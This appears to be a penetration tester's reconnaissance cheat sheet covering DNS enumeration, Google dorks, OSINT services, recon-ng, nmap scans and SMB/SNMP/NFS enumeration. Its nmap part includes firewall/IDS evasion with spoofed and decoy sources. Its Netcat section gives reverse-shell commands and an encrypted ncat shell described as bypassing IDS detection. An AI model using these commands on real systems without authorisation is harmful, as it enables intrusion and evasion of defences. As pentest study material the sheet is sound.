Information Gathering

[*] DNS Enumeration
	Commands
		whois
		dig
		nslookup
		host
		dnsenum
		dnsrecon
		host
	Websites
		https://viewdns.info/
		https://threatintelligenceplatform.com/


	Zone Transfer
		host -t ns zonetransfer.me
		host -l reaper-ut.com nsztm2.zonetransfer.me
		fierce -dns domain.com

	host example
	    Generic retrieval
	        host <domain>
    	Name Servers
    	    host -t ns <domain>
    	CNames:
    	    host -t cname <domain>
    	TXT Records
    	    host -t txt <domain>
    	Noisy, gather all
    	    host -a <domain>
    	IPv4
    	    host -4 <domain>
    	IPv6
    	    host -6 <domain>

    nslookup example
    	NameServer
    	    nslookup -type=ns <domain>
    	SOA (Start of Authority)
    	    nslookup -type=soa <domain>
    	Mail Exchange
    	    nslookup -query=mx <domain>
    	Noisy, gather everything
    	    nslookup -type=any <domain>    


	dig example
    	Noisy, gather everything
    	    dig axfr <domain>
    	TXT
    	    dig TXT <domain>
    	MX
    	    dig MX <domain>
    	A
    	    dig A <domain>
    	AAA
    	    dig AAA <domain>
    	SOA
    	    dig SOA <domain>
    	MX
    	    dig MX <domain>
    	CNAME
    	    dig CNAME <domain>
    	Gather IPs
    	    dig +short <domain>
    	Save to file
    	    dig any <domain> -f /path/to/file.txt



[*] Email gather
	theHarvester -d <domain.com> -l 500 -b

[*] Website enumeration
	netcraft.com
	buildwith.com

[*] All Around information Gathering
	shodan.io
	https://search.censys.io/

[*] Recon-ng
	Plan on getting keys for each module.
	[recon-ng][reaper] > keys list

	+--------------------------+
	|       Name       | Value |
	+--------------------------+
	| bing_api         |       |
	| builtwith_api    |       |
	| censysio_id      |       |
	| censysio_secret  |       |
	| flickr_api       |       |
	| fullcontact_api  |       |
	| github_api       |       |
	| google_api       |       |
	| hashes_api       |       |
	| hibp_api         |       |
	| ipinfodb_api     |       |
	| ipstack_api      |       |
	| jigsaw_api       |       |
	| jigsaw_password  |       |
	| jigsaw_username  |       |
	| pwnedlist_api    |       |
	| pwnedlist_iv     |       |
	| pwnedlist_secret |       |
	| shodan_api       |       |
	| twitter_api      |       |
	| twitter_secret   |       |
	| virustotal_api   |       |
	+--------------------------+


[*] Google Dorks
	Explit-DB
		https://www.exploit-db.com/google-hacking-database

	google.com dorks
		https://support.google.com/websearch/answer/2466433
		https://www.google.com/advanced_search
	    Search
	    +                   Addition
	    -                   Subtraction
	    *                   Multiplication
	    /                   Division
	    % of                Percentage
	    ^                   Raise to a power
	    site:               Search only one website
	    link:               Find linked pages
	    daterange:          search within specific date range
	    safesearch:         exclude adult content
	    info:               find info about a page
	    related:            related pages
	    cache:              view cached page
	    filetype:           restrict search to specific filetype
	    allintitle:         search for keywords in page title
	    inurl:              restrict search to page URLs
	    site:<domain>       specific domain search
	    site:country code   Restrict search to country
	    intext:             Search for keyword in body text
	    allintext:          Return pages with all words specified in body text
	    book                Search book text
	    phonebook:          find a phone number
	    bphonebook:         find business phone numbers
	    weather             Get Local Weather 

	    Symbol / Syntax			Function
	    "search phrase"			Find results with exact search phrase
	    OSINT filetype:pdf			Find files of type PDF related to a certain term.
	    salary site:blog.tryhackme.com	Limit search results to a specific site.
	    pentest -site:example.com		Exclude a specific site from results
	    walkthrough intitle:TryHackMe	Find pages with a specific term in the page title.
	    challenge inurl:tryhackme		Find pages with a specific term in the page URL.
	Note: In addition to pdf, other filetypes to consider are: doc, docx, ppt, pptx, xls and xlsx.

[*] Duckduckgo
	https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/

[*] Bing
	https://support.microsoft.com/en-us/topic/advanced-search-options-b92e25f1-0085-4271-bdf9-14aaea720930


[*] nmap
	nmap -T5 -A -O -oA nmap/192.168.1.1-24-subnet 192.168.1.1/24 -vvv
	nmap -T3 -sV -A -O -oA nmap/192.168.1.1-host-fingerprint -Pn -n -vvvv
	nmap -T3 -sV -p- -oA nmap/192.168.1.1-tcp 192.168.1.1 -Pn -n -vvvv
	nmap -T3 -sV -sU -oA nmap/192.168.1.1-udp 192.168.1.1 -Pn -n -vvvv
	nmap -T3 -sV -sC --script=vuln -p 22,23 -oA nmap/192.168.1.1-vuln 192.168.1.1 -Pn -n -vvvv
	nmap 192.168.1.1 -sn --packet-trace --disable-arp-ping
	nmap 192.168.1.1/24 -F --initial-rtt-timeout 50mms --max-rtt-timeout 100ms
	nmap 192.168.1.1/24 -F --min-rate 300

	Bypass Firewall/IDS/IPS
		Use ACK packets, response should be RST. Unfiltered is what you want here.
		nmap 192.168.1.1 -sA -Pn -n --disable-arp-ping --packet-trace

	Spoofed 5 source IPs for decoys
		nmap 192.168.1.1 -p 80 -Pn -n --disable-arp-ping --packet-trace -D RND:5

	Spoof source ip
		nmap 192.168.1.1 -n -Pn -O -S 192.168.1.6 -e tun0

	DNS Proxying
		nmap 192.168.1.1 -p 50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
		Keep in mind, if this works, the IDS/IPS will allow us to connect:
			ncat -nv --source-port 53 192.168.1.1 50000

	Need to share results via html? Use xsltproc to convert, then open the file in a browser:
		xsltproc 10.129.248.135-full-tcp.xml -o 10.129.248.135-full-tcp.html

	NMAP Scripting Engine:
Category 	Description
auth 		Determination of authentication credentials.
broadcast 	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
brute 		Executes scripts that try to log in to the respective service by brute-forcing with credentials.
default 	Default scripts executed by using the -sC option.
discovery 	Evaluation of accessible services.
dos 		These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
exploit 	This category of scripts tries to exploit known vulnerabilities for the scanned port.
external 	Scripts that use external services for further processing.
fuzzer 		This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
intrusive 	Intrusive scripts that could negatively affect the target system.
malware 	Checks if some malware infects the target system.
safe 		Defensive scripts that do not perform intrusive and destructive access.
version 	Extension for service detection.
vuln 		Identification of specific vulnerabilities.


	Port states:
State			Description
open			This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.
closed			When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.
filtered		Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
unfiltered		This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.
open|filtered		If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.
closed|filtered		This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.



[*] Netcat
	Netcat scanning
		nc -znv 192.168.1.1 22 # TCP
		nc -znvu 192.168.1.1 22 #  UDP
		nc -nv 192.168.1.1 22 # grab a banner


	Reverse Shell Windows
		Windows Client:
        	nc.exe <ip addr> <port> -m cmd.exe
        Kali Server
        	nc -lvnp <port>

	Use ncat for encryption - good to bypass IDS detection
    	On client - victim machine
        	ncat -v <ip address> <port> --ssl
    	On Server - Attacker machine
        	ncat -lvnp <port number> --ssl
	File Transfer:
		On listening machine:
			nc -lvnp 1337 > file-name
		On machine with file:
			nc -nv 192.168.1.1 1337 < /path/to/file-name


[*] Port Scanning
	hping3
	nmblookup
    	nmblookup -A 192.168.1.1
	nbtscan
    	nbtscan 192.168.1.0/24
	smbmap
    	smbmap -H 192.168.1.101
	smbclient
    	smbclient -L 192.168.1.101
	rpcclient
    	rpcclient -U "" -N 192.168.1.101
	rpcclient -U '' <ip addr>
		enumdomusers
		enumdomgroups
		enumdomains
		queryusergroups <0xXXX> # the user found from uenumdomusers but the rid value
	enum4linux
    	enum4linux -a <ipv4>
	onesixtyone
    	onesixtyone -c /path/to/onesixtyone/dict.txt <ipv4>
	snmpwalk
    	snmpwalk -c public <ipv4> -v1
	snmpset
    	snmpset -v 1 -c private <ipv4> <integers> s <new string>


 [*] Mounting IP Addresses
    NFS:
        showmount -e 192.168.1.80
        mount -t nfs 192.168.1.80:/mount/data/directory /tmp/nfs_mount
    
